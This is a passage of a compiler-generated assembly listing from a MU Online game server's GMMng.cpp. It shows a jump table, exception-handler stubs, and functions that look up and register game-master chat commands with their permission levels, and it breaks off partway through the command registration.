  03f09	01		 DB	 1
  03f0a	21		 DB	 33			; 00000021H
  03f0b	21		 DB	 33			; 00000021H
  03f0c	21		 DB	 33			; 00000021H
  03f0d	21		 DB	 33			; 00000021H
  03f0e	21		 DB	 33			; 00000021H
  03f0f	21		 DB	 33			; 00000021H
  03f10	21		 DB	 33			; 00000021H
  03f11	21		 DB	 33			; 00000021H
  03f12	21		 DB	 33			; 00000021H
  03f13	21		 DB	 33			; 00000021H
  03f14	21		 DB	 33			; 00000021H
  03f15	21		 DB	 33			; 00000021H
  03f16	21		 DB	 33			; 00000021H
  03f17	21		 DB	 33			; 00000021H
  03f18	21		 DB	 33			; 00000021H
  03f19	21		 DB	 33			; 00000021H
  03f1a	21		 DB	 33			; 00000021H
  03f1b	21		 DB	 33			; 00000021H
  03f1c	21		 DB	 33			; 00000021H
  03f1d	21		 DB	 33			; 00000021H
  03f1e	21		 DB	 33			; 00000021H
  03f1f	21		 DB	 33			; 00000021H
  03f20	21		 DB	 33			; 00000021H
  03f21	21		 DB	 33			; 00000021H
  03f22	21		 DB	 33			; 00000021H
  03f23	21		 DB	 33			; 00000021H
  03f24	21		 DB	 33			; 00000021H
  03f25	21		 DB	 33			; 00000021H
  03f26	21		 DB	 33			; 00000021H
  03f27	21		 DB	 33			; 00000021H
  03f28	21		 DB	 33			; 00000021H
  03f29	21		 DB	 33			; 00000021H
  03f2a	21		 DB	 33			; 00000021H
  03f2b	21		 DB	 33			; 00000021H
  03f2c	21		 DB	 33			; 00000021H
  03f2d	21		 DB	 33			; 00000021H
  03f2e	21		 DB	 33			; 00000021H
  03f2f	21		 DB	 33			; 00000021H
  03f30	21		 DB	 33			; 00000021H
  03f31	21		 DB	 33			; 00000021H
  03f32	21		 DB	 33			; 00000021H
  03f33	21		 DB	 33			; 00000021H
  03f34	21		 DB	 33			; 00000021H
  03f35	21		 DB	 33			; 00000021H
  03f36	21		 DB	 33			; 00000021H
  03f37	21		 DB	 33			; 00000021H
  03f38	21		 DB	 33			; 00000021H
  03f39	02		 DB	 2
  03f3a	03		 DB	 3
  03f3b	04		 DB	 4
  03f3c	05		 DB	 5
  03f3d	06		 DB	 6
  03f3e	07		 DB	 7
  03f3f	08		 DB	 8
  03f40	09		 DB	 9
  03f41	0a		 DB	 10			; 0000000aH
  03f42	0b		 DB	 11			; 0000000bH
  03f43	21		 DB	 33			; 00000021H
  03f44	0c		 DB	 12			; 0000000cH
  03f45	0d		 DB	 13			; 0000000dH
  03f46	0e		 DB	 14			; 0000000eH
  03f47	0f		 DB	 15			; 0000000fH
  03f48	10		 DB	 16			; 00000010H
  03f49	11		 DB	 17			; 00000011H
  03f4a	12		 DB	 18			; 00000012H
  03f4b	13		 DB	 19			; 00000013H
  03f4c	14		 DB	 20			; 00000014H
  03f4d	15		 DB	 21			; 00000015H
  03f4e	16		 DB	 22			; 00000016H
  03f4f	17		 DB	 23			; 00000017H
  03f50	18		 DB	 24			; 00000018H
  03f51	19		 DB	 25			; 00000019H
  03f52	21		 DB	 33			; 00000021H
  03f53	21		 DB	 33			; 00000021H
  03f54	21		 DB	 33			; 00000021H
  03f55	21		 DB	 33			; 00000021H
  03f56	21		 DB	 33			; 00000021H
  03f57	21		 DB	 33			; 00000021H
  03f58	21		 DB	 33			; 00000021H
  03f59	21		 DB	 33			; 00000021H
  03f5a	21		 DB	 33			; 00000021H
  03f5b	21		 DB	 33			; 00000021H
  03f5c	21		 DB	 33			; 00000021H
  03f5d	21		 DB	 33			; 00000021H
  03f5e	21		 DB	 33			; 00000021H
  03f5f	21		 DB	 33			; 00000021H
  03f60	21		 DB	 33			; 00000021H
  03f61	21		 DB	 33			; 00000021H
  03f62	21		 DB	 33			; 00000021H
  03f63	21		 DB	 33			; 00000021H
  03f64	21		 DB	 33			; 00000021H
  03f65	21		 DB	 33			; 00000021H
  03f66	21		 DB	 33			; 00000021H
  03f67	21		 DB	 33			; 00000021H
  03f68	21		 DB	 33			; 00000021H
  03f69	21		 DB	 33			; 00000021H
  03f6a	1a		 DB	 26			; 0000001aH
  03f6b	1b		 DB	 27			; 0000001bH
  03f6c	1c		 DB	 28			; 0000001cH
  03f6d	1d		 DB	 29			; 0000001dH
  03f6e	1e		 DB	 30			; 0000001eH
  03f6f	1f		 DB	 31			; 0000001fH
  03f70	20		 DB	 32			; 00000020H
_TEXT	ENDS
;	COMDAT text$x
text$x	SEGMENT
__unwindfunclet$?ManagementProc@CGMMng@@QAEHPAVOBJECTSTRUCT@@PADH@Z$0:
  00000	8d 8d 88 e5 ff
	ff		 lea	 ecx, DWORD PTR $T2[ebp]
  00006	e9 00 00 00 00	 jmp	 ??1?$CStringT@DV?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@@ATL@@QAE@XZ ; ATL::CStringT<char,StrTraitMFC<char,ATL::ChTraitsCRT<char> > >::~CStringT<char,StrTraitMFC<char,ATL::ChTraitsCRT<char> > >
  0000b	cc		 int	 3
  0000c	cc		 int	 3
  0000d	cc		 int	 3
  0000e	cc		 int	 3
  0000f	cc		 int	 3
__ehhandler$?ManagementProc@CGMMng@@QAEHPAVOBJECTSTRUCT@@PADH@Z:
  00010	90		 npad	 1
  00011	90		 npad	 1
  00012	8b 54 24 08	 mov	 edx, DWORD PTR [esp+8]
  00016	8d 42 0c	 lea	 eax, DWORD PTR [edx+12]
  00019	8b 8a 7c e5 ff
	ff		 mov	 ecx, DWORD PTR [edx-6788]
  0001f	33 c8		 xor	 ecx, eax
  00021	e8 00 00 00 00	 call	 @__security_check_cookie@4
  00026	8b 4a fc	 mov	 ecx, DWORD PTR [edx-4]
  00029	33 c8		 xor	 ecx, eax
  0002b	e8 00 00 00 00	 call	 @__security_check_cookie@4
  00030	b8 00 00 00 00	 mov	 eax, OFFSET __ehfuncinfo$?ManagementProc@CGMMng@@QAEHPAVOBJECTSTRUCT@@PADH@Z
  00035	e9 00 00 00 00	 jmp	 ___CxxFrameHandler3
text$x	ENDS
?ManagementProc@CGMMng@@QAEHPAVOBJECTSTRUCT@@PADH@Z ENDP ; CGMMng::ManagementProc
; Function compile flags: /Odtp /ZI
; File C:\Mu Online\Mu-GS-Webzen-MC-10093\GameServer\GMMng.cpp
;	COMDAT ?SearchCmd@CGMMng@@QAE_NPADAAHAAK@Z
_TEXT	SEGMENT
_n$1 = -8						; size = 4
_this$ = -4						; size = 4
_szCmd$ = 8						; size = 4
_iOutCmd$ = 12						; size = 4
_iOutAuthority$ = 16					; size = 4
?SearchCmd@CGMMng@@QAE_NPADAAHAAK@Z PROC		; CGMMng::SearchCmd, COMDAT
; _this$ = ecx

; 695  : {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 48	 sub	 esp, 72			; 00000048H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 696  : 	for( int n=0; n<MAX_GMCOMMAND; n++)

  0000c	c7 45 f8 00 00
	00 00		 mov	 DWORD PTR _n$1[ebp], 0
  00013	eb 09		 jmp	 SHORT $LN4@SearchCmd
$LN2@SearchCmd:
  00015	8b 45 f8	 mov	 eax, DWORD PTR _n$1[ebp]
  00018	83 c0 01	 add	 eax, 1
  0001b	89 45 f8	 mov	 DWORD PTR _n$1[ebp], eax
$LN4@SearchCmd:
  0001e	81 7d f8 c2 01
	00 00		 cmp	 DWORD PTR _n$1[ebp], 450 ; 000001c2H
  00025	7d 56		 jge	 SHORT $LN3@SearchCmd

; 697  : 	{
; 698  : 		if( cCommand.nCmdCode[n] > 0 )

  00027	8b 45 f8	 mov	 eax, DWORD PTR _n$1[ebp]
  0002a	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0002d	83 bc 81 2c 23
	00 00 00	 cmp	 DWORD PTR [ecx+eax*4+9004], 0
  00035	7e 44		 jle	 SHORT $LN5@SearchCmd

; 699  : 		{
; 700  : 			if( _stricmp(szCmd, cCommand.szCmd[n]) == 0 )

  00037	6b 45 f8 14	 imul	 eax, DWORD PTR _n$1[ebp], 20
  0003b	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0003e	8d 54 01 04	 lea	 edx, DWORD PTR [ecx+eax+4]
  00042	52		 push	 edx
  00043	8b 45 08	 mov	 eax, DWORD PTR _szCmd$[ebp]
  00046	50		 push	 eax
  00047	e8 00 00 00 00	 call	 __stricmp
  0004c	83 c4 08	 add	 esp, 8
  0004f	85 c0		 test	 eax, eax
  00051	75 28		 jne	 SHORT $LN5@SearchCmd

; 701  : 			{
; 702  : 				iOutCmd = cCommand.nCmdCode[n];

  00053	8b 45 0c	 mov	 eax, DWORD PTR _iOutCmd$[ebp]
  00056	8b 4d f8	 mov	 ecx, DWORD PTR _n$1[ebp]
  00059	8b 55 fc	 mov	 edx, DWORD PTR _this$[ebp]
  0005c	8b 8c 8a 2c 23
	00 00		 mov	 ecx, DWORD PTR [edx+ecx*4+9004]
  00063	89 08		 mov	 DWORD PTR [eax], ecx

; 703  : 				iOutAuthority = cCommand.dwAuthority[n];

  00065	8b 45 10	 mov	 eax, DWORD PTR _iOutAuthority$[ebp]
  00068	8b 4d f8	 mov	 ecx, DWORD PTR _n$1[ebp]
  0006b	8b 55 fc	 mov	 edx, DWORD PTR _this$[ebp]
  0006e	8b 8c 8a 34 2a
	00 00		 mov	 ecx, DWORD PTR [edx+ecx*4+10804]
  00075	89 08		 mov	 DWORD PTR [eax], ecx

; 704  : 				return(true);

  00077	b0 01		 mov	 al, 1
  00079	eb 04		 jmp	 SHORT $LN1@SearchCmd
$LN5@SearchCmd:

; 705  : 			}
; 706  : 		}
; 707  : 	}

  0007b	eb 98		 jmp	 SHORT $LN2@SearchCmd
$LN3@SearchCmd:

; 708  : 
; 709  : 	return(false);

  0007d	32 c0		 xor	 al, al
$LN1@SearchCmd:

; 710  : }

  0007f	5f		 pop	 edi
  00080	5e		 pop	 esi
  00081	5b		 pop	 ebx
  00082	8b e5		 mov	 esp, ebp
  00084	5d		 pop	 ebp
  00085	c2 0c 00	 ret	 12			; 0000000cH
?SearchCmd@CGMMng@@QAE_NPADAAHAAK@Z ENDP		; CGMMng::SearchCmd
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Mu Online\Mu-GS-Webzen-MC-10093\GameServer\GMMng.cpp
;	COMDAT ?GetCmd@CGMMng@@QAEHPAD@Z
_TEXT	SEGMENT
_n$1 = -8						; size = 4
_this$ = -4						; size = 4
_szCmd$ = 8						; size = 4
?GetCmd@CGMMng@@QAEHPAD@Z PROC				; CGMMng::GetCmd, COMDAT
; _this$ = ecx

; 667  : {	

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 48	 sub	 esp, 72			; 00000048H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 668  : 	for( int n=0; n<MAX_GMCOMMAND; n++)

  0000c	c7 45 f8 00 00
	00 00		 mov	 DWORD PTR _n$1[ebp], 0
  00013	eb 09		 jmp	 SHORT $LN4@GetCmd
$LN2@GetCmd:
  00015	8b 45 f8	 mov	 eax, DWORD PTR _n$1[ebp]
  00018	83 c0 01	 add	 eax, 1
  0001b	89 45 f8	 mov	 DWORD PTR _n$1[ebp], eax
$LN4@GetCmd:
  0001e	81 7d f8 c2 01
	00 00		 cmp	 DWORD PTR _n$1[ebp], 450 ; 000001c2H
  00025	7d 3d		 jge	 SHORT $LN3@GetCmd

; 669  : 	{
; 670  : 		if( cCommand.nCmdCode[n] > 0 )

  00027	8b 45 f8	 mov	 eax, DWORD PTR _n$1[ebp]
  0002a	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0002d	83 bc 81 2c 23
	00 00 00	 cmp	 DWORD PTR [ecx+eax*4+9004], 0
  00035	7e 2b		 jle	 SHORT $LN5@GetCmd

; 671  : 		{
; 672  : 			if( _stricmp(szCmd, cCommand.szCmd[n]) == 0 )

  00037	6b 45 f8 14	 imul	 eax, DWORD PTR _n$1[ebp], 20
  0003b	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0003e	8d 54 01 04	 lea	 edx, DWORD PTR [ecx+eax+4]
  00042	52		 push	 edx
  00043	8b 45 08	 mov	 eax, DWORD PTR _szCmd$[ebp]
  00046	50		 push	 eax
  00047	e8 00 00 00 00	 call	 __stricmp
  0004c	83 c4 08	 add	 esp, 8
  0004f	85 c0		 test	 eax, eax
  00051	75 0f		 jne	 SHORT $LN5@GetCmd

; 673  : 			{
; 674  : 				return cCommand.nCmdCode[n];

  00053	8b 45 f8	 mov	 eax, DWORD PTR _n$1[ebp]
  00056	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00059	8b 84 81 2c 23
	00 00		 mov	 eax, DWORD PTR [ecx+eax*4+9004]
  00060	eb 04		 jmp	 SHORT $LN1@GetCmd
$LN5@GetCmd:

; 675  : 			}
; 676  : 		}
; 677  : 	}

  00062	eb b1		 jmp	 SHORT $LN2@GetCmd
$LN3@GetCmd:

; 678  : 
; 679  : 	/*
; 680  : 	for( n=3020; n<MAX_GMCOMMAND; n++)
; 681  : 	{
; 682  : 		if( cCommand.nCmdCode[n] > 0 )
; 683  : 		{
; 684  : 			if( strcmp(strlwr(szCmd), cCommand.szCmd[n]) == 0 )
; 685  : 			{
; 686  : 				return cCommand.nCmdCode[n];
; 687  : 			}
; 688  : 		}
; 689  : 	}
; 690  : 	*/
; 691  : 	return 0;

  00064	33 c0		 xor	 eax, eax
$LN1@GetCmd:

; 692  : }

  00066	5f		 pop	 edi
  00067	5e		 pop	 esi
  00068	5b		 pop	 ebx
  00069	8b e5		 mov	 esp, ebp
  0006b	5d		 pop	 ebp
  0006c	c2 04 00	 ret	 4
?GetCmd@CGMMng@@QAEHPAD@Z ENDP				; CGMMng::GetCmd
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Mu Online\Mu-GS-Webzen-MC-10093\GameServer\GMMng.cpp
;	COMDAT ?Init@CGMMng@@QAEXXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?Init@CGMMng@@QAEXXZ PROC				; CGMMng::Init, COMDAT
; _this$ = ecx

; 179  : {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 44	 sub	 esp, 68			; 00000044H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 180  : 	cCommand.Init();

  0000c	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000f	83 c1 04	 add	 ecx, 4
  00012	e8 00 00 00 00	 call	 ?Init@CGMCommand@@QAEXXZ ; CGMCommand::Init

; 181  : 	cCommand.Add("/disconnect",		GMCMD_DISCONNECT,					AUTHORITY_ADMIN | AUTHORITY_EVENT_GM );

  00017	6a 22		 push	 34			; 00000022H
  00019	6a 64		 push	 100			; 00000064H
  0001b	68 00 00 00 00	 push	 OFFSET ??_C@_0M@NAACLKOB@?1disconnect@
  00020	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00023	83 c1 04	 add	 ecx, 4
  00026	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 182  : 	cCommand.Add("/whisperoff",		GMCMD_CHATBAN,						AUTHORITY_ADMIN | AUTHORITY_EVENT_GM );

  0002b	6a 22		 push	 34			; 00000022H
  0002d	6a 68		 push	 104			; 00000068H
  0002f	68 00 00 00 00	 push	 OFFSET ??_C@_0M@CECLOOK@?1whisperoff@
  00034	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00037	83 c1 04	 add	 ecx, 4
  0003a	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 183  : 	cCommand.Add("/whisperon",		GMCMD_CHATBANFREE,					AUTHORITY_ADMIN | AUTHORITY_EVENT_GM );

  0003f	6a 22		 push	 34			; 00000022H
  00041	6a 6a		 push	 106			; 0000006aH
  00043	68 00 00 00 00	 push	 OFFSET ??_C@_0L@EDCFKOKG@?1whisperon@
  00048	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0004b	83 c1 04	 add	 ecx, 4
  0004e	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 184  : 	cCommand.Add("/guildmove",	GMCMD_GUILDSETPOSITION,				AUTHORITY_ADMIN | AUTHORITY_EVENT_GM );

  00053	6a 22		 push	 34			; 00000022H
  00055	6a 6c		 push	 108			; 0000006cH
  00057	68 00 00 00 00	 push	 OFFSET ??_C@_0L@FCNFKDHF@?1guildmove@
  0005c	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0005f	83 c1 04	 add	 ecx, 4
  00062	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 185  : 	cCommand.Add("/guilddisconnect",	GMCMD_GUILDDISCONNECT,				AUTHORITY_ADMIN | AUTHORITY_EVENT_GM );

  00067	6a 22		 push	 34			; 00000022H
  00069	6a 70		 push	 112			; 00000070H
  0006b	68 00 00 00 00	 push	 OFFSET ??_C@_0BB@IMEJJNPL@?1guilddisconnect@
  00070	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00073	83 c1 04	 add	 ecx, 4
  00076	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 186  : 	cCommand.Add("/warend",			GMCMD_GUILDWAREND,					AUTHORITY_ADMIN);

  0007b	6a 02		 push	 2
  0007d	6a 6f		 push	 111			; 0000006fH
  0007f	68 00 00 00 00	 push	 OFFSET ??_C@_07JMNOJOCB@?1warend@
  00084	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00087	83 c1 04	 add	 ecx, 4
  0008a	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 187  : 	cCommand.Add("/warstart",			GMCMD_GUILDWARSTART,				AUTHORITY_ADMIN);

  0008f	6a 02		 push	 2
  00091	6a 6d		 push	 109			; 0000006dH
  00093	68 00 00 00 00	 push	 OFFSET ??_C@_09EPAPKJCF@?1warstart@
  00098	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0009b	83 c1 04	 add	 ecx, 4
  0009e	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 188  : 	cCommand.Add("/warstop",		GMCMD_GUILDWARSTOP,					AUTHORITY_ADMIN);

  000a3	6a 02		 push	 2
  000a5	6a 6e		 push	 110			; 0000006eH
  000a7	68 00 00 00 00	 push	 OFFSET ??_C@_08LPJLINAO@?1warstop@
  000ac	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  000af	83 c1 04	 add	 ecx, 4
  000b2	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 189  : 
; 190  : #ifdef GMCOMMAND_EX
; 191  : 	cCommand.Add("/",			GMCMD_GETABILITY,					AUTHORITY_ADMIN | AUTHORITY_EVENT_GM);

  000b7	6a 22		 push	 34			; 00000022H
  000b9	68 f5 01 00 00	 push	 501			; 000001f5H
  000be	68 00 00 00 00	 push	 OFFSET ??_C@_05GPBILLLO@?1?$LE?I?$LH?B@
  000c3	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  000c6	83 c1 04	 add	 ecx, 4
  000c9	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 192  : 	cCommand.Add("/",			GMCMD_PARTYINFO,					AUTHORITY_ADMIN | AUTHORITY_EVENT_GM);

  000ce	6a 22		 push	 34			; 00000022H
  000d0	68 f6 01 00 00	 push	 502			; 000001f6H
  000d5	68 00 00 00 00	 push	 OFFSET ??_C@_05PKOPIGND@?1?F?D?F?$LM@
  000da	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  000dd	83 c1 04	 add	 ecx, 4
  000e0	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 193  : 	cCommand.Add("/",		GMCMD_SUMMONMONSTER,				AUTHORITY_ADMIN | AUTHORITY_EVENT_GM);

  000e5	6a 22		 push	 34			; 00000022H
  000e7	68 f7 01 00 00	 push	 503			; 000001f7H
  000ec	68 00 00 00 00	 push	 OFFSET ??_C@_0M@NCLLHGHP@?1?$LI?s?$LN?$LK?E?M?$LM?R?H?$KP@
  000f1	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  000f4	83 c1 04	 add	 ecx, 4
  000f7	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 194  : 	cCommand.Add("/",		GMCMD_CLEARMONSTER,					AUTHORITY_ADMIN | AUTHORITY_EVENT_GM);

  000fc	6a 22		 push	 34			; 00000022H
  000fe	68 f8 01 00 00	 push	 504			; 000001f8H
  00103	68 00 00 00 00	 push	 OFFSET ??_C@_0M@PCFENPAP@?1?$LI?s?$LN?$LK?E?M?A?$KG?$LA?E@
  00108	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0010b	83 c1 04	 add	 ecx, 4
  0010e	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 195  : 	cCommand.Add("/",		GMCMD_CLEARITEM,					AUTHORITY_ADMIN | AUTHORITY_EVENT_GM);

  00113	6a 22		 push	 34			; 00000022H
  00115	68 f9 01 00 00	 push	 505			; 000001f9H
  0011a	68 00 00 00 00	 push	 OFFSET ??_C@_0M@CKGHABCD@?1?$LO?F?$MA?L?E?$NL?A?$KG?$LA?E@
  0011f	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00122	83 c1 04	 add	 ecx, 4
  00125	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 196  : 	cCommand.Add("/",		GMCMD_CLEARINVEN,					AUTHORITY_ADMIN | AUTHORITY_EVENT_GM);

  0012a	6a 22		 push	 34			; 00000022H
  0012c	68 fa 01 00 00	 push	 506			; 000001faH
  00131	68 00 00 00 00	 push	 OFFSET ??_C@_09HHLKFDID@?1?$MA?N?$LK?$KF?A?$KG?$LA?E@
  00136	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00139	83 c1 04	 add	 ecx, 4
  0013c	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 197  : 	cCommand.Add("/",		GMCMD_SUMMONCHARACTER,				AUTHORITY_ADMIN | AUTHORITY_EVENT_GM);

  00141	6a 22		 push	 34			; 00000022H
  00143	68 fb 01 00 00	 push	 507			; 000001fbH
  00148	68 00 00 00 00	 push	 OFFSET ??_C@_0M@MGPFMLOL@?1?D?$LD?$LI?$KP?E?M?$LM?R?H?$KP@
  0014d	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00150	83 c1 04	 add	 ecx, 4
  00153	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 198  : 
; 199  : 	cCommand.Add("/ability",		GMCMD_GETABILITY,					AUTHORITY_ADMIN | AUTHORITY_EVENT_GM);

  00158	6a 22		 push	 34			; 00000022H
  0015a	68 f5 01 00 00	 push	 501			; 000001f5H
  0015f	68 00 00 00 00	 push	 OFFSET ??_C@_08NMMECFKO@?1ability@
  00164	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00167	83 c1 04	 add	 ecx, 4
  0016a	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 200  : 	cCommand.Add("/party",			GMCMD_PARTYINFO,					AUTHORITY_ADMIN | AUTHORITY_EVENT_GM);

  0016f	6a 22		 push	 34			; 00000022H
  00171	68 f6 01 00 00	 push	 502			; 000001f6H
  00176	68 00 00 00 00	 push	 OFFSET ??_C@_06JICFFAOM@?1party@
  0017b	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0017e	83 c1 04	 add	 ecx, 4
  00181	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 201  : 	cCommand.Add("/summonmonster",	GMCMD_SUMMONMONSTER,				AUTHORITY_ADMIN | AUTHORITY_EVENT_GM);

  00186	6a 22		 push	 34			; 00000022H
  00188	68 f7 01 00 00	 push	 503			; 000001f7H
  0018d	68 00 00 00 00	 push	 OFFSET ??_C@_0P@FBJALDCH@?1summonmonster@
  00192	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00195	83 c1 04	 add	 ecx, 4
  00198	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 202  : 	cCommand.Add("/clearmonster",	GMCMD_CLEARMONSTER,					AUTHORITY_ADMIN | AUTHORITY_EVENT_GM);

  0019d	6a 22		 push	 34			; 00000022H
  0019f	68 f8 01 00 00	 push	 504			; 000001f8H
  001a4	68 00 00 00 00	 push	 OFFSET ??_C@_0O@OHPCDLEP@?1clearmonster@
  001a9	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  001ac	83 c1 04	 add	 ecx, 4
  001af	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 203  : 	cCommand.Add("/clearitem",		GMCMD_CLEARITEM,					AUTHORITY_ADMIN | AUTHORITY_EVENT_GM);

  001b4	6a 22		 push	 34			; 00000022H
  001b6	68 f9 01 00 00	 push	 505			; 000001f9H
  001bb	68 00 00 00 00	 push	 OFFSET ??_C@_0L@BMILIDFD@?1clearitem@
  001c0	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  001c3	83 c1 04	 add	 ecx, 4
  001c6	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 204  : 	cCommand.Add("/clearinven",		GMCMD_CLEARINVEN,					AUTHORITY_ADMIN | AUTHORITY_EVENT_GM);

  001cb	6a 22		 push	 34			; 00000022H
  001cd	68 fa 01 00 00	 push	 506			; 000001faH
  001d2	68 00 00 00 00	 push	 OFFSET ??_C@_0M@GPOPOLAO@?1clearinven@
  001d7	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  001da	83 c1 04	 add	 ecx, 4
  001dd	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 205  : 	cCommand.Add("/summonchar",		GMCMD_SUMMONCHARACTER,				AUTHORITY_ADMIN | AUTHORITY_EVENT_GM);

  001e2	6a 22		 push	 34			; 00000022H
  001e4	68 fb 01 00 00	 push	 507			; 000001fbH
  001e9	68 00 00 00 00	 push	 OFFSET ??_C@_0M@EEPBOOJK@?1summonchar@
  001ee	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  001f1	83 c1 04	 add	 ecx, 4
  001f4	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 206  : #endif // GMCOMMAND_EX
; 207  : 
; 208  : 	cCommand.Add(lMsg.Get(3013),	UMCMD_BILLCHECK,					AUTHORITY_EVENT_GM | AUTHORITY_USER);

  001f9	6a 21		 push	 33			; 00000021H
  001fb	68 c9 00 00 00	 push	 201			; 000000c9H
  00200	68 c5 0b 00 00	 push	 3013			; 00000bc5H
  00205	b9 00 00 00 00	 mov	 ecx, OFFSET ?lMsg@@3VCMsg@@A ; lMsg
  0020a	ff 15 00 00 00
	00		 call	 DWORD PTR __imp_?Get@CMsg@@QAEPADH@Z
  00210	50		 push	 eax
  00211	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00214	83 c1 04	 add	 ecx, 4
  00217	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 209  : 
; 210  : 	cCommand.Add("/war",			UMCMD_GUILDWAR,						AUTHORITY_EVENT_GM | AUTHORITY_USER);

  0021c	6a 21		 push	 33			; 00000021H
  0021e	68 c8 00 00 00	 push	 200			; 000000c8H
  00223	68 00 00 00 00	 push	 OFFSET ??_C@_04NILIJCHB@?1war@
  00228	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0022b	83 c1 04	 add	 ecx, 4
  0022e	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 211  : #ifdef BATTLESOCCERWAR_COMMAND_BUGFIX_20090310
; 212  : 	cCommand.Add("/soccer",	UMCMD_BATTLESOCCERWAR,				AUTHORITY_ADMIN	   | AUTHORITY_USER);
; 213  : #else
; 214  : 	cCommand.Add("/soccer",	UMCMD_BATTLESOCCERWAR,				AUTHORITY_ADMIN);

  00233	6a 02		 push	 2
  00235	68 ca 00 00 00	 push	 202			; 000000caH
  0023a	68 00 00 00 00	 push	 OFFSET ??_C@_07DKLNGAJK@?1soccer@
  0023f	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00242	83 c1 04	 add	 ecx, 4
  00245	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 215  : #endif // BATTLESOCCERWAR_COMMAND_BUGFIX_20090310
; 216  : 	cCommand.Add(lMsg.Get(3016),	UMCMD_TRADEOPTION,					AUTHORITY_EVENT_GM | AUTHORITY_USER);

  0024a	6a 21		 push	 33			; 00000021H
